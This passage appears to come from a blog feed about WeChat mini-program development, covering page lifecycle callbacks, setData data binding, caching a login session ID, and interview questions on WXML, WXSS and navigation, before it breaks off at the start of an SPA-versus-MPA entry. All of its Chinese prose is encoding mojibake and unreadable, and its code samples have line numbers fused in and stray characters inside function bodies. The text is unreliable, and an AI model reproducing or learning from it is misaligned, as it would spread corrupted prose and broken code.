å™¨æŽ¥å—ä¸€ä¸ªObjectå‚æ•°ï¼Œå‚æ•°è¯´æ˜Žå¦‚è¡¨3-4æ‰€ç¤ºï¼Œå…¶ä¸­dataå±žæ€§æ˜¯å½“å‰é¡µé¢WXMLæ¨¡æ¿ä¸­å¯ä»¥ç”¨æ¥åšæ•°æ®ç»‘å®šçš„åˆå§‹æ•°æ®ï¼Œæˆ‘ä»¬ä¼šåœ¨åŽæ–‡å±•å¼€è®¨è®ºï¼›onLoad / onReady / onShow / onHide /onUnload 5ä¸ªå›žè°ƒæ˜¯Pageå®žä¾‹çš„ç”Ÿå‘½å‘¨æœŸå‡½æ•°ï¼Œæˆ‘ä»¬åœ¨åŽæ–‡å±•å¼€ï¼›onPullDownRefresh / onReachBottom / onShareAppMessage / onPageScroll 4ä¸ªå›žè°ƒæ˜¯é¡µé¢çš„ç”¨æˆ·è¡Œä¸ºï¼Œæˆ‘ä»¬ä¹Ÿä¼šåœ¨åŽæ–‡å±•å¼€ã€‚ä»£ç æ¸…å•3-8 Pageæž„é€ å™¨ 123456789101112Page(&#123; data: &#123; text: "This is page data." &#125;, onLoad: function(options) &#123; f&#125;, onReady: function() &#123; f&#125;, onShow: function() &#123;ff &#125;, onHide: function() &#123;f &#125;, onUnload: function() &#123;f &#125;, onPullDownRefresh: function() &#123;f &#125;, onReachBottom: function() &#123; f&#125;, onShareAppMessage: function () &#123;f &#125;, onPageScroll: function() &#123; f&#125;&#125;) ç”Ÿå‘½å‘¨æœŸåˆæ¬¡è¿›å…¥å°ç¨‹åºçš„æ—¶å€™ï¼Œå¾®ä¿¡å®¢æˆ·ç«¯åˆå§‹åŒ–å¥½å®¿ä¸»çŽ¯å¢ƒï¼ŒåŒæ—¶ä»Žç½‘ç»œä¸‹è½½æˆ–è€…ä»Žæœ¬åœ°ç¼“å­˜ä¸­æ‹¿åˆ°å°ç¨‹åºçš„ä»£ç åŒ…ï¼ŒæŠŠå®ƒæ³¨å…¥åˆ°å®¿ä¸»çŽ¯å¢ƒï¼Œåˆå§‹åŒ–å®Œæ¯•åŽï¼Œå¾®ä¿¡å®¢æˆ·ç«¯å°±ä¼šç»™Appå®žä¾‹æ´¾å‘onLaunchäº‹ä»¶ï¼ŒAppæž„é€ å™¨å‚æ•°æ‰€å®šä¹‰çš„onLaunchæ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚è¿›å…¥å°ç¨‹åºä¹‹åŽï¼Œç”¨æˆ·å¯ä»¥ç‚¹å‡»å³ä¸Šè§’çš„å…³é—­ï¼Œæˆ–è€…æŒ‰æ‰‹æœºè®¾å¤‡çš„Homeé”®ç¦»å¼€å°ç¨‹åºï¼Œæ­¤æ—¶å°ç¨‹åºå¹¶æ²¡æœ‰è¢«ç›´æŽ¥é”€æ¯ï¼Œæˆ‘ä»¬æŠŠè¿™ç§æƒ…å†µç§°ä¸ºâ€œå°ç¨‹åºè¿›å…¥åŽå°çŠ¶æ€â€ï¼ŒAppæž„é€ å™¨å‚æ•°æ‰€å®šä¹‰çš„onHideæ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚å½“å†æ¬¡å›žåˆ°å¾®ä¿¡æˆ–è€…å†æ¬¡æ‰“å¼€å°ç¨‹åºæ—¶ï¼Œå¾®ä¿¡å®¢æˆ·ç«¯ä¼šæŠŠâ€œåŽå°â€çš„å°ç¨‹åºå”¤é†’ï¼Œæˆ‘ä»¬æŠŠè¿™ç§æƒ…å†µç§°ä¸ºâ€œå°ç¨‹åºè¿›å…¥å‰å°çŠ¶æ€â€ï¼ŒAppæž„é€ å™¨å‚æ•°æ‰€å®šä¹‰çš„onShowæ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒAppçš„ç”Ÿå‘½å‘¨æœŸæ˜¯ç”±å¾®ä¿¡å®¢æˆ·ç«¯æ ¹æ®ç”¨æˆ·æ“ä½œä¸»åŠ¨è§¦å‘çš„ã€‚ä¸ºäº†é¿å…ç¨‹åºä¸Šçš„æ··ä¹±ï¼Œæˆ‘ä»¬ä¸åº”è¯¥ä»Žå…¶ä»–ä»£ç é‡Œä¸»åŠ¨è°ƒç”¨Appå®žä¾‹çš„ç”Ÿå‘½å‘¨æœŸå‡½æ•°ã€‚ é¡µé¢åˆæ¬¡åŠ è½½çš„æ—¶å€™ï¼Œå¾®ä¿¡å®¢æˆ·ç«¯å°±ä¼šç»™Pageå®žä¾‹æ´¾å‘onLoadäº‹ä»¶ï¼ŒPageæž„é€ å™¨å‚æ•°æ‰€å®šä¹‰çš„onLoadæ–¹æ³•ä¼šè¢«è°ƒç”¨ï¼ŒonLoadåœ¨é¡µé¢æ²¡è¢«é”€æ¯ä¹‹å‰åªä¼šè§¦å‘1æ¬¡ï¼Œåœ¨onLoadçš„å›žè°ƒä¸­ï¼Œå¯ä»¥èŽ·å–å½“å‰é¡µé¢æ‰€è°ƒç”¨çš„æ‰“å¼€å‚æ•°optionï¼Œå…³äºŽæ‰“å¼€å‚æ•°æˆ‘ä»¬æ”¾åœ¨è¿™ä¸€èŠ‚çš„æœ€åŽå†å±•å¼€é˜è¿°ã€‚é¡µé¢æ˜¾ç¤ºä¹‹åŽï¼ŒPageæž„é€ å™¨å‚æ•°æ‰€å®šä¹‰çš„onShowæ–¹æ³•ä¼šè¢«è°ƒç”¨ï¼Œä¸€èˆ¬ä»Žåˆ«çš„é¡µé¢è¿”å›žåˆ°å½“å‰é¡µé¢æ—¶ï¼Œå½“å‰é¡µçš„onShowæ–¹æ³•éƒ½ä¼šè¢«è°ƒç”¨ã€‚åœ¨é¡µé¢åˆæ¬¡æ¸²æŸ“å®Œæˆæ—¶ï¼ŒPageæž„é€ å™¨å‚æ•°æ‰€å®šä¹‰çš„onReadyæ–¹æ³•ä¼šè¢«è°ƒç”¨ï¼ŒonReadyåœ¨é¡µé¢æ²¡è¢«é”€æ¯å‰åªä¼šè§¦å‘1æ¬¡ï¼ŒonReadyè§¦å‘æ—¶ï¼Œè¡¨ç¤ºé¡µé¢å·²ç»å‡†å¤‡å¦¥å½“ï¼Œåœ¨é€»è¾‘å±‚å°±å¯ä»¥å’Œè§†å›¾å±‚è¿›è¡Œäº¤äº’äº†ã€‚ä»¥ä¸Šä¸‰ä¸ªäº‹ä»¶è§¦å‘çš„æ—¶æœºæ˜¯onLoadæ—©äºŽ onShowï¼ŒonShowæ—©äºŽonReadyã€‚é¡µé¢ä¸å¯è§æ—¶ï¼ŒPageæž„é€ å™¨å‚æ•°æ‰€å®šä¹‰çš„onHideæ–¹æ³•ä¼šè¢«è°ƒç”¨ï¼Œè¿™ç§æƒ…å†µä¼šåœ¨ä½¿ç”¨wx.navigateToåˆ‡æ¢åˆ°å…¶ä»–é¡µé¢ã€åº•éƒ¨tabåˆ‡æ¢æ—¶è§¦å‘ã€‚å½“å‰é¡µé¢ä½¿ç”¨wx.redirectToæˆ–wx.navigateBackè¿”å›žåˆ°å…¶ä»–é¡µæ—¶ï¼Œå½“å‰é¡µé¢ä¼šè¢«å¾®ä¿¡å®¢æˆ·ç«¯é”€æ¯å›žæ”¶ï¼Œæ­¤æ—¶Pageæž„é€ å™¨å‚æ•°æ‰€å®šä¹‰çš„onUnloadæ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒPageçš„ç”Ÿå‘½å‘¨æœŸæ˜¯ç”±å¾®ä¿¡å®¢æˆ·ç«¯æ ¹æ®ç”¨æˆ·æ“ä½œä¸»åŠ¨è§¦å‘çš„ã€‚ä¸ºäº†é¿å…ç¨‹åºä¸Šçš„æ··ä¹±ï¼Œæˆ‘ä»¬ä¸åº”è¯¥åœ¨å…¶ä»–ä»£ç ä¸­ä¸»åŠ¨è°ƒç”¨Pageå®žä¾‹çš„ç”Ÿå‘½å‘¨æœŸå‡½æ•°ã€‚ æ•°æ®ç»‘å®šåœ¨ç½‘é¡µçš„ä¸€èˆ¬å¼€å‘æµç¨‹ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸ä¼šé€šè¿‡ JS æ“ä½œ DOM (å¯¹åº” HTML çš„æè¿°äº§ç”Ÿçš„æ ‘)ï¼Œä»¥å¼•èµ·ç•Œé¢çš„ä¸€äº›å˜åŒ–å“åº”ç”¨æˆ·çš„è¡Œä¸ºã€‚ä¾‹å¦‚ï¼Œç”¨æˆ·ç‚¹å‡»æŸä¸ªæŒ‰é’®çš„æ—¶å€™ï¼ŒJS ä¼šè®°å½•ä¸€äº›çŠ¶æ€åˆ° JS å˜é‡é‡Œè¾¹ï¼ŒåŒæ—¶é€šè¿‡ DOMAPI æ“æŽ§ DOM çš„å±žæ€§æˆ–è€…è¡Œä¸ºï¼Œè¿›è€Œå¼•èµ·ç•Œé¢ä¸€äº›å˜åŒ–ã€‚å½“é¡¹ç›®è¶Šæ¥è¶Šå¤§çš„æ—¶å€™ï¼Œä½ çš„ä»£ç ä¼šå……æ–¥ç€éžå¸¸å¤šçš„ç•Œé¢äº¤äº’é€»è¾‘å’Œç¨‹åºçš„å„ç§çŠ¶æ€å˜é‡ï¼Œæ˜¾ç„¶è¿™ä¸æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„å¼€å‘æ¨¡å¼ï¼Œå› æ­¤å°±æœ‰äº† MVVM çš„å¼€å‘æ¨¡å¼ï¼ˆä¾‹å¦‚ React, Vueï¼‰ï¼Œæå€¡æŠŠæ¸²æŸ“å’Œé€»è¾‘åˆ†ç¦»ã€‚ç®€å•æ¥è¯´å°±æ˜¯ä¸è¦å†è®© JS ç›´æŽ¥æ“æŽ§ DOMï¼ŒJS åªéœ€è¦ç®¡ç†çŠ¶æ€å³å¯ï¼Œç„¶åŽå†é€šè¿‡ä¸€ç§æ¨¡æ¿è¯­æ³•æ¥æè¿°çŠ¶æ€å’Œç•Œé¢ç»“æž„çš„å…³ç³»å³å¯ã€‚ WXML é€šè¿‡ æ¥ç»‘å®š WXML æ–‡ä»¶å’Œå¯¹åº”çš„ JavaScript æ–‡ä»¶ä¸­çš„ data å¯¹è±¡å±žæ€§ã€‚å¦‚æžœä½ éœ€è¦æŠŠä¸€ä¸ª Hello World çš„å­—ç¬¦ä¸²æ˜¾ç¤ºåœ¨ç•Œé¢ä¸Šã€‚ WXML æ˜¯è¿™ä¹ˆå†™ : 1&lt;text&gt;&#123;&#123;msg&#125;&#125;&lt;/text&gt; JS åªéœ€è¦ç®¡ç†çŠ¶æ€å³å¯: 1this.setData(&#123; msg: "Hello World" &#125;) é€šè¿‡ ç‰¹å®šçš„è¯­æ³•æŠŠä¸€ä¸ªå˜é‡ç»‘å®šåˆ°ç•Œé¢ä¸Šï¼Œæˆ‘ä»¬ç§°ä¸ºæ•°æ®ç»‘å®šã€‚ä»…ä»…é€šè¿‡æ•°æ®ç»‘å®šè¿˜ä¸å¤Ÿå®Œæ•´çš„æè¿°çŠ¶æ€å’Œç•Œé¢çš„å…³ç³»ï¼Œè¿˜éœ€è¦ if/else, forç­‰æŽ§åˆ¶èƒ½åŠ›ï¼Œåœ¨å°ç¨‹åºé‡Œè¾¹ï¼Œè¿™äº›æŽ§åˆ¶èƒ½åŠ›éƒ½ç”¨ wx: å¼€å¤´çš„å±žæ€§æ¥è¡¨è¾¾ã€‚ setDataä¼ é€’æ•°æ®å®žé™…æ˜¯ä¸€ä¸ªå¼‚æ­¥çš„è¿‡ç¨‹ï¼Œæ‰€ä»¥setDataçš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªcallbackå›žè°ƒï¼Œåœ¨è¿™æ¬¡setDataå¯¹ç•Œé¢æ¸²æŸ“å®Œæ¯•åŽè§¦å‘ã€‚setDataå…¶ä¸€èˆ¬è°ƒç”¨æ ¼å¼æ˜¯ setData(data, callback)ï¼Œå…¶ä¸­dataæ˜¯ç”±å¤šä¸ªkey: valueæž„æˆçš„Objectå¯¹è±¡ã€‚ 12345678910// page.jsPage(&#123; onLoad: function()&#123; this.setData(&#123; text: 'change data' &#125;, function()&#123; // åœ¨è¿™æ¬¡setDataå¯¹ç•Œé¢æ¸²æŸ“å®Œæ¯•åŽè§¦å‘ &#125;) &#125;&#125;) å…¶ä»–ç™»å½• åˆ©ç”¨æœ¬åœ°ç¼“å­˜çš„èƒ½åŠ›æ¥æŒä¹…åŒ–å­˜å‚¨ç”¨æˆ·ç™»å½•æ€SessionId 123456app.globalData.sessionId =data.sessionIdwx.setStorageSync('SESSIONID',data.sessionId)// å‡è®¾ç™»å½•æ€ä¿æŒ1å¤©var expiredTime = +new Date() +1*24*60*60*1000app.globalData.expiredTime =expiredTimewx.setStorageSync('EXPIREDTIME',expiredTime) 1 è¯·è°ˆè°ˆå¾®ä¿¡å°ç¨‹åºä¸»è¦ç›®å½•å’Œæ–‡ä»¶çš„ä½œç”¨ï¼Ÿ project.config.json é¡¹ç›®é…ç½®æ–‡ä»¶ï¼Œç”¨å¾—æœ€å¤šçš„å°±æ˜¯é…ç½®æ˜¯å¦å¼€å¯httpsæ ¡éªŒï¼› App.js è®¾ç½®ä¸€äº›å…¨å±€çš„åŸºç¡€æ•°æ®ç­‰ï¼› App.json åº•éƒ¨tab, æ ‡é¢˜æ å’Œè·¯ç”±ç­‰è®¾ç½®ï¼› App.wxss å…¬å…±æ ·å¼ï¼Œå¼•å…¥iconfontç­‰ï¼› pages é‡Œé¢åŒ…å«ä¸€ä¸ªä¸ªå…·ä½“çš„é¡µé¢ï¼› index.json (é…ç½®å½“å‰é¡µé¢æ ‡é¢˜å’Œå¼•å…¥ç»„ä»¶ç­‰)ï¼› index.wxml (é¡µé¢ç»“æž„)ï¼› index.wxss (é¡µé¢æ ·å¼è¡¨)ï¼› index.js (é¡µé¢çš„é€»è¾‘ï¼Œè¯·æ±‚å’Œæ•°æ®å¤„ç†ç­‰)ï¼› 2 è¯·è°ˆè°ˆwxmlä¸Žæ ‡å‡†çš„htmlçš„å¼‚åŒï¼Ÿ éƒ½æ˜¯ç”¨æ¥æè¿°é¡µé¢çš„ç»“æž„ï¼› éƒ½ç”±æ ‡ç­¾ã€å±žæ€§ç­‰æž„æˆï¼› æ ‡ç­¾åå­—ä¸ä¸€æ ·ï¼Œä¸”å°ç¨‹åºæ ‡ç­¾æ›´å°‘ï¼Œå•ä¸€æ ‡ç­¾æ›´å¤šï¼› å¤šäº†ä¸€äº› wx:if è¿™æ ·çš„å±žæ€§ä»¥åŠ è¿™æ ·çš„è¡¨è¾¾å¼ WXMLä»…èƒ½åœ¨å¾®ä¿¡å°ç¨‹åºå¼€å‘è€…å·¥å…·ä¸­é¢„è§ˆï¼Œè€ŒHTMLå¯ä»¥åœ¨æµè§ˆå™¨å†…é¢„è§ˆ ç»„ä»¶å°è£…ä¸åŒï¼Œ WXMLå¯¹ç»„ä»¶è¿›è¡Œäº†é‡æ–°å°è£…ï¼Œ å°ç¨‹åºè¿è¡Œåœ¨JS Coreå†…ï¼Œæ²¡æœ‰DOMæ ‘å’Œwindowå¯¹è±¡ï¼Œå°ç¨‹åºä¸­æ— æ³•ä½¿ç”¨windowå¯¹è±¡å’Œdocumentå¯¹è±¡ã€‚ 3 è¯·è°ˆè°ˆWXSSå’ŒCSSçš„å¼‚åŒï¼Ÿ éƒ½æ˜¯ç”¨æ¥æè¿°é¡µé¢çš„æ ·å­ï¼› WXSS å…·æœ‰ CSS å¤§éƒ¨åˆ†çš„ç‰¹æ€§ï¼Œä¹Ÿåšäº†ä¸€äº›æ‰©å……å’Œä¿®æ”¹ï¼› WXSSæ–°å¢žäº†å°ºå¯¸å•ä½ï¼ŒWXSS åœ¨åº•å±‚æ”¯æŒæ–°çš„å°ºå¯¸å•ä½ rpxï¼› WXSS ä»…æ”¯æŒéƒ¨åˆ† CSS é€‰æ‹©å™¨ï¼› WXSS æä¾›å…¨å±€æ ·å¼ä¸Žå±€éƒ¨æ ·å¼ 4 ä½ æ˜¯æ€Žä¹ˆå°è£…å¾®ä¿¡å°ç¨‹åºçš„æ•°æ®è¯·æ±‚çš„ï¼Ÿ åœ¨æ ¹ç›®å½•ä¸‹åˆ›å»ºutilsç›®å½•åŠapi.jsæ–‡ä»¶å’ŒapiConfig.jsæ–‡ä»¶ï¼› åœ¨apiConfig.js å°è£…åŸºç¡€çš„get, post å’Œ putï¼Œ uploadç­‰è¯·æ±‚æ–¹æ³•ï¼Œè®¾ç½®è¯·æ±‚ä½“ï¼Œå¸¦ä¸Štokenå’Œå¼‚å¸¸å¤„ç†ç­‰ï¼› åœ¨apiä¸­å¼•å…¥apiConfig.jså°è£…å¥½çš„è¯·æ±‚æ–¹æ³•ï¼Œæ ¹æ®é¡µé¢æ•°æ®è¯·æ±‚çš„urls, è®¾ç½®å¯¹åº”çš„æ–¹æ³•å¹¶å¯¼å‡ºï¼› åœ¨å…·ä½“çš„é¡µé¢ä¸­å¯¼å…¥ï¼› 5 å°ç¨‹åºé¡µé¢é—´æœ‰å“ªäº›ä¼ é€’æ•°æ®çš„æ–¹æ³•ï¼Ÿ ä½¿ç”¨å…¨å±€å˜é‡å®žçŽ°æ•°æ®ä¼ é€’ é¡µé¢è·³è½¬æˆ–é‡å®šå‘æ—¶ï¼Œä½¿ç”¨urlå¸¦å‚æ•°ä¼ é€’æ•°æ® ä½¿ç”¨ç»„ä»¶æ¨¡æ¿ templateä¼ é€’å‚æ•° ä½¿ç”¨ç¼“å­˜ä¼ é€’å‚æ•° ä½¿ç”¨æ•°æ®åº“ä¼ é€’æ•°æ® 6 è¯·è°ˆè°ˆå°ç¨‹åºçš„åŒå‘ç»‘å®šå’Œvueçš„å¼‚åŒï¼Ÿå¤§ä½“ç›¸åŒï¼Œä½†å°ç¨‹åºç›´æŽ¥this.dataçš„å±žæ€§æ˜¯ä¸å¯ä»¥åŒæ­¥åˆ°è§†å›¾çš„ï¼Œå¿…é¡»è°ƒç”¨this.setData()æ–¹æ³•ï¼ 7 è¯·è°ˆè°ˆå°ç¨‹åºçš„ç”Ÿå‘½å‘¨æœŸå‡½æ•°ï¼Ÿ onLoad() é¡µé¢åŠ è½½æ—¶è§¦å‘ï¼Œåªä¼šè°ƒç”¨ä¸€æ¬¡ï¼Œå¯èŽ·å–å½“å‰é¡µé¢è·¯å¾„ä¸­çš„å‚æ•°ã€‚ onShow() é¡µé¢æ˜¾ç¤º/åˆ‡å…¥å‰å°æ—¶è§¦å‘ï¼Œä¸€èˆ¬ç”¨æ¥å‘é€æ•°æ®è¯·æ±‚ï¼› onReady() é¡µé¢åˆæ¬¡æ¸²æŸ“å®Œæˆæ—¶è§¦å‘, åªä¼šè°ƒç”¨ä¸€æ¬¡ï¼Œä»£è¡¨é¡µé¢å·²å¯å’Œè§†å›¾å±‚è¿›è¡Œäº¤äº’ã€‚ onHide() é¡µé¢éšè—/åˆ‡å…¥åŽå°æ—¶è§¦å‘, å¦‚åº•éƒ¨ tab åˆ‡æ¢åˆ°å…¶ä»–é¡µé¢æˆ–å°ç¨‹åºåˆ‡å…¥åŽå°ç­‰ã€‚ onUnload() é¡µé¢å¸è½½æ—¶è§¦å‘ï¼Œå¦‚redirectToæˆ–navigateBackåˆ°å…¶ä»–é¡µé¢æ—¶ã€‚ 8 ç®€è¿°å¾®ä¿¡å°ç¨‹åºåŽŸç†ï¼Ÿ å°ç¨‹åºæœ¬è´¨å°±æ˜¯ä¸€ä¸ªå•é¡µé¢åº”ç”¨ï¼Œæ‰€æœ‰çš„é¡µé¢æ¸²æŸ“å’Œäº‹ä»¶å¤„ç†ï¼Œéƒ½åœ¨ä¸€ä¸ªé¡µé¢å†…è¿›è¡Œï¼Œä½†åˆå¯ä»¥é€šè¿‡å¾®ä¿¡å®¢æˆ·ç«¯è°ƒç”¨åŽŸç”Ÿçš„å„ç§æŽ¥å£ï¼› å®ƒçš„æž¶æž„ï¼Œæ˜¯æ•°æ®é©±åŠ¨çš„æž¶æž„æ¨¡å¼ï¼Œå®ƒçš„UIå’Œæ•°æ®æ˜¯åˆ†ç¦»çš„ï¼Œæ‰€æœ‰çš„é¡µé¢æ›´æ–°ï¼Œéƒ½éœ€è¦é€šè¿‡å¯¹æ•°æ®çš„æ›´æ”¹æ¥å®žçŽ°ï¼› å®ƒä»ŽæŠ€æœ¯è®²å’ŒçŽ°æœ‰çš„å‰ç«¯å¼€å‘å·®ä¸å¤šï¼Œé‡‡ç”¨JavaScriptã€WXMLã€WXSSä¸‰ç§æŠ€æœ¯è¿›è¡Œå¼€å‘ï¼› åŠŸèƒ½å¯åˆ†ä¸ºwebviewå’ŒappServiceä¸¤ä¸ªéƒ¨åˆ†ï¼› webviewç”¨æ¥å±•çŽ°UIï¼ŒappServiceæœ‰æ¥å¤„ç†ä¸šåŠ¡é€»è¾‘ã€æ•°æ®åŠæŽ¥å£è°ƒç”¨ï¼› ä¸¤ä¸ªéƒ¨åˆ†åœ¨ä¸¤ä¸ªè¿›ç¨‹ä¸­è¿è¡Œï¼Œé€šè¿‡ç³»ç»Ÿå±‚JSBridgeå®žçŽ°é€šä¿¡ï¼Œå®žçŽ°UIçš„æ¸²æŸ“ã€äº‹ä»¶çš„å¤„ç†ç­‰ã€‚ 9 è¯·è°ˆè°ˆåŽŸç”Ÿå¼€å‘å°ç¨‹åºã€wepyã€mpvue çš„å¯¹æ¯”ï¼Ÿ ä¸ªäººè®¤ä¸ºï¼Œå¦‚æžœæ˜¯æ–°é¡¹ç›®ï¼Œä¸”æ²¡æœ‰æ—§çš„ h5 é¡¹ç›®è¿ç§»ï¼Œåˆ™è€ƒè™‘ç”¨å°ç¨‹åºåŽŸç”Ÿå¼€å‘ï¼Œå¥½å¤„æ˜¯ç›¸æ¯”äºŽç¬¬ä¸‰æ–¹æ¡†æž¶ï¼Œå‘å°‘ã€‚ è€Œå¦‚æžœæœ‰ è€çš„ h5 é¡¹ç›®æ˜¯ vue å¼€å‘ æˆ–è€… ä¹Ÿæœ‰ h5 é¡¹ç›®ä¹Ÿéœ€è¦å°ç¨‹åºå¼€å‘ï¼Œåˆ™æ¯”è¾ƒé€‚åˆ wepy æˆ–è€… mpvue æ¥åšè¿ç§»æˆ–è€…å¼€å‘ï¼Œè¿‘æœŸçœ‹wepyå‡ ä¹Žä¸æ›´æ–°äº†ï¼Œæ‰€ä»¥æŽ¨èç¾Žå›¢çš„mpvueã€‚ è€Œå¦‚æžœå¦‚æžœå›¢é˜Ÿå‰ç«¯å¼ºå¤§ï¼Œè‡ªå·±åšä¸€å¥—æ¡†æž¶ä¹Ÿæ²¡é—®é¢˜ã€‚ 1.å¦‚ä½•å®žçŽ°ä¸‹æ‹‰åˆ·æ–° é¦–å…ˆåœ¨app.jsonæˆ–è€…é¡µé¢çš„jsonä¸­é…ç½®enablePullDownRefreshä¸ºtrue åœ¨ Pageä¸­ä½¿ç”¨onPullDownRefresh å‡½æ•°,è¯¥å‡½æ•°åœ¨ä¸‹æ‹‰åˆ·æ–°æ—¶æ‰§è¡Œ åœ¨ä¸‹æ‹‰å‡½æ•°æ‰§è¡Œæ—¶å‘èµ·æ•°æ®è¯·æ±‚ï¼Œè¯·æ±‚è¿”å›žåŽï¼Œè°ƒç”¨ wx.stopPullDownRefresh åœæ­¢ä¸‹æ‹‰åˆ·æ–°çš„çŠ¶æ€ 2.æ€Žä¹ˆè§£å†³å°ç¨‹åºçš„å¼‚æ­¥è¯·æ±‚é—®é¢˜ ä¸å°è£…æŽ¥å£çš„è¯å¯ä»¥åœ¨è¿”å›žæˆåŠŸçš„å›žè°ƒé‡Œé¢å¤„ç†é€»è¾‘ å¯ä»¥ç”¨Promise æ¥å°è£… å¯ä»¥å¼•ç”¨runtimeæ¥ä½¿ç”¨async await ä½¿ç”¨wepyæˆ–ç€ç¾Žå›¢çš„å°ç¨‹åºæ¡†æž¶ï¼Œå¯ä»¥é€šè¿‡å®‰è£…åº“è§£å†³ 3.å°è£…å¾®ä¿¡å°ç¨‹åºçš„æ•°æ®è¯·æ±‚çš„ å°†æ‰€æœ‰çš„æŽ¥å£æ”¾åœ¨ç»Ÿä¸€çš„jsæ–‡ä»¶ä¸­å¹¶å¯¼å‡º åœ¨app.jsä¸­åˆ›å»ºå°è£…è¯·æ±‚æ•°æ®çš„æ–¹æ³• åœ¨å­é¡µé¢ä¸­è°ƒç”¨å°è£…çš„æ–¹æ³•è¯·æ±‚æ•°æ® 4.bindtapå’Œcatchtapçš„åŒºåˆ«æ˜¯ä»€ä¹ˆ bindtapæ˜¯ä¸ä¼šé˜»æ­¢å†’æ³¡äº‹ä»¶çš„ï¼Œcatchtapæ˜¯é˜»å€¼å†’æ³¡çš„ 5.è·³è½¬é¡µé¢ wx.navigateTo()ï¼šä¿ç•™å½“å‰é¡µé¢ï¼Œè·³è½¬åˆ°åº”ç”¨å†…çš„æŸä¸ªé¡µé¢ã€‚ä½†æ˜¯ä¸èƒ½è·³åˆ° tabbar é¡µé¢ï¼ˆå‚æ•°å¿…é¡»ä¸ºå­—ç¬¦ä¸²ï¼‰ wx.redirectTo()ï¼šå…³é—­å½“å‰é¡µé¢ï¼Œè·³è½¬åˆ°åº”ç”¨å†…çš„æŸä¸ªé¡µé¢ã€‚ä½†æ˜¯ä¸å…è®¸è·³è½¬åˆ° tabbar é¡µé¢ wx.switchTab()ï¼šè·³è½¬åˆ° abBar é¡µé¢ï¼Œå¹¶å…³é—­å…¶ä»–æ‰€æœ‰éž tabBar é¡µé¢ wx.navigateBack()å…³é—­å½“å‰é¡µé¢ï¼Œè¿”å›žä¸Šä¸€é¡µé¢æˆ–å¤šçº§é¡µé¢ã€‚å¯é€šè¿‡ getCurrentPages() èŽ·å–å½“å‰çš„é¡µé¢æ ˆï¼Œå†³å®šéœ€è¦è¿”å›žå‡ å±‚ wx.reLaunch()ï¼šå…³é—­æ‰€æœ‰é¡µé¢ï¼Œæ‰“å¼€åˆ°åº”ç”¨å†…çš„æŸä¸ªé¡µé¢ é€šè¿‡navigatorè·³è½¬ 6.å°ç¨‹åºè·³è½¬tabéœ€è¦æ³¨æ„å“ªäº›ï¼Ÿ ç­”ï¼šå¿…é¡»ç”¨wx.switchTab(Object object)ï¼Œéœ€è¦è·³è½¬çš„é¡µé¢å¿…é¡»æ˜¯åœ¨app.jsonä¸­çš„tabBaræ³¨å†Œè¿‡çš„ï¼Œå¹¶ä¸”è·¯å¾„åŽä¸èƒ½å¸¦å‚æ•° 7.å°ç¨‹åºå¦‚ä½•å®žçŽ°è·¨é¡µé¢è·³è½¬ 1//è¿™ä¸ªæ­¥éª¤æœ‰ç‚¹é•¿ï¼Œå…ˆæŒ–ä¸ªå‘ï¼Œä»¥åŽæœ‰æ—¶é—´å¡« 8.wxmlä¼ å€¼ æ·»åŠ data-å±žæ€§æ¥ä¼ é€’æˆ‘ä»¬éœ€è¦çš„å€¼ï¼Œç„¶åŽé€šè¿‡e.currentTarget.datasetèŽ·å– éœ€è¦æ³¨æ„ï¼šå‘½åå¦‚æžœæœ‰å¤§å†™ï¼Œå¦‚ï¼šdata-IDï¼Œåœ¨èŽ·å–çš„æ—¶å€™éƒ½æ˜¯å°å†™ï¼Œå³ï¼šev.currentTarget.dataset.id 9.app.onLaunchçš„å¼‚æ­¥è§£å†³ 12//å›žè°ƒ//è¿˜æœ‰åˆ«çš„æ–¹æ³• ä»¥åŽå†å†™ æ„Ÿè§‰èƒ½å†™ä¸€ç¯‡ 10.setDataçš„å›žè°ƒå‡½æ•° ç­”ï¼šå¾®ä¿¡å°ç¨‹åºçš„setDataå®žçŽ°æ˜¯å’Œreactçš„setDataå®žçŽ°ç±»ä¼¼çš„ï¼Œæ‰€ä»¥å®ƒä¹Ÿæ˜¯ä¸€ä¸ªå¼‚æ­¥å‡½æ•°ï¼Œå¹¶ä¸”æœ‰å›žè°ƒå‡½æ•°çš„å‚æ•°ï¼Œå½“ç„¶å¹³æ—¶å°é‡æ•°æ®æˆ‘ä»¬å¯èƒ½å¹¶æ²¡æœ‰æ„Ÿè§‰åˆ°å®ƒçš„å¼‚æ­¥ï¼Œä½†æ˜¯ä¸ºäº†ç¡®ä¿é€»è¾‘çš„æ­£ç¡®æ‰§è¡Œï¼Œåœ¨éœ€è¦ç”¨åˆ°setDataåŽ dataé‡Œçš„æ•°æ®çš„æ­¥éª¤ï¼Œè¯·å†™å…¥setDataçš„å›žè°ƒå‡½æ•°ä¸­ï¼Œå¦‚ä¸‹ç¤ºä¾‹ï¼š 1234this.setData(&#123; a: this.data.a++ &#125;,()=&gt;&#123;&#125;)]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2FSPA%2F</url>
    <content type="text"><![CDATA[å‰è¨€ SPAä¸ŽMPAå¯¹æ¯”SPAå•é¡µé¢çš„ä¼˜ç‚¹ï¼š1ï¼Œç”¨æˆ·ä½“éªŒå¥½ï¼Œå¿«ï¼Œå†…å®¹çš„æ”¹å˜ä¸éœ€è¦é‡æ–°åŠ è½½æ•´ä¸ªé¡µé¢ï¼ŒåŸºäºŽè¿™ä¸€ç‚¹spaå¯¹æœåŠ¡å™¨åŽ‹åŠ›è¾ƒå° 2ï¼Œå‰åŽç«¯åˆ†ç¦» 3ï¼Œé¡µé¢æ•ˆæžœä¼šæ¯”è¾ƒç‚«é…·ï¼ˆæ¯”å¦‚åˆ‡æ¢é¡µé¢å†…å®¹æ—¶çš„ä¸“åœºåŠ¨ç”»ï¼‰ å•é¡µé¢ç¼ºç‚¹ï¼š1ï¼Œä¸åˆ©äºŽseo 